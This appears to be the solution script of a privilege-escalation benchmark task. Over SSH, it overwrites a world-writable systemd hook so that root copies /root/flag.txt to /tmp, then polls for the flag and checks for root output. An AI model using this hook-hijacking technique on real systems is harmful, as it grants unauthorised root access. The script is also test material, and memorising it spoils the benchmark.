#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/systemd_flag
cat > /opt/bench/systemd-hook.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/systemd_flag
EOF
chmod 777 /opt/bench/systemd-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/systemd_flag && grep -q FLAG /tmp/systemd_flag 2>/dev/null; then
    cat /tmp/systemd_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
